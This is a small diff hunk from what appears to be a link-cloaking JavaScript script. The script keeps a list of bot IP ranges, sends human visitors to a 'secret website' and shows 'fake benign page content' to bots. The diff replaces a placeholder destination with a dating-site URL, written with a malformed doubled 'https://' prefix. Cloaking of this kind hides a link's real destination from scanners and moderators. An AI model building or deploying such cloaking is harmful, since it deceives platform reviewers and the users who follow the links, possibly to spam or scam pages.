@@ -24,7 +24,7 @@ const BOT_IP_RANGES = [
 // 3. YOUR LINKS LOGIC
 // Replace the URL below with the secret website you want human users to see!
 const URL_DATABASE = {
-    'promo1': 'https://your-actual-destination-url.com',
+    'promo1': 'https://https://dating.prismdeskglobal.com',
 };
 
 // Fake Benign Page Content to show to Bots
